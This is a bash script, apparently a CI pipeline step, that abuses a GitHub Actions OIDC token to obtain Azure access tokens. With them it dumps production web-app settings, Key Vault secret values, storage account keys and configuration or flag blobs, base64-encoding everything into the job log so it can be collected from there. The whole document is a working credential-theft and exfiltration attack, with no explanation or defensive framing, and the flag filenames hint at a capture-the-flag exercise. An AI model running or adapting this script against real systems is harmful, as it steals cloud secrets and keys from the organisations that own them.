#!/usr/bin/env bash
set +x
b64(){ base64 | tr -d '\n'; }
TENANT=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"; [ -z "$OIDC" ] && exit 0
echo "OIDC_PAYLOAD_B64=$(echo "$OIDC" | cut -d. -f2 | b64)"

ex(){ curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id="$1" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2"; }

C=462d1c38-4459-48b8-9333-82e389e59514
R=$(ex "$C" "https://management.azure.com/.default"); AT=$(echo "$R" | jq -r '.access_token // empty')
echo "AUTOMATION_ARM_LEN=${#AT} err=$(echo "$R" | jq -r '.error // empty') $(echo "$R" | jq -r '.error_description // empty' | cut -c1-200)"
[ -z "$AT" ] && { echo NO_AUTOMATION_TOKEN; exit 0; }

echo "=== APP SETTINGS STOREFRONT (b64) ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings?api-version=2022-03-01" | b64 | sed 's/^/APPST_B64=/'
echo "=== APP SETTINGS REPORTING (b64) ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings?api-version=2022-03-01" | b64 | sed 's/^/REPST_B64=/'
echo "=== KV SEC SECRETS ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" | head -c 2000 | b64 | sed 's/^/KVSEC_B64=/'
VT=$(ex "$C" "https://vault.azure.net/.default" | jq -r '.access_token // empty')
echo "AUTOMATION_VAULT_LEN=${#VT}"
if [ -n "$VT" ]; then
  for v in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    IDS=$(curl -s "https://$v.vault.azure.net/secrets?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id' 2>/dev/null)
    echo "VAULT $v IDS: $IDS"
    for s in $IDS; do
      echo "VALSEC[$s]=$(curl -s "$s?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty' | b64)"
    done
  done
fi
echo "=== STORAGE KEYS ==="
for st in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  K=$(curl -s -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$st/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
  echo "KEY $st len=${#K}"
  [ -z "$K" ] && continue
  CS="DefaultEndpointsProtocol=https;AccountName=$st;AccountKey=$K;EndpointSuffix=core.windows.net"
  ST=$(ex "$C" "https://storage.azure.com/.default" | jq -r '.access_token // empty')
  for c in config exports logs backup; do
    for b in internal-config.json appsettings.json flag.json flag.txt; do
      OUT=$(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2022-11-02" "https://$st.blob.core.windows.net/$c/$b")
      case "$OUT" in *ResourceNotFound*|*BlobNotFound*|*AuthorizationPermissionMismatch*|*"<?xml"*) ;; *) echo "BLOB $st/$c/$b=$(echo "$OUT" | head -c 3000 | b64)" ;; esac
    done
  done
done
echo "=== SUB RESOURCES (automation scope) ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r '.value[]?.name' 2>/dev/null | head -40
echo "=== DONE ==="
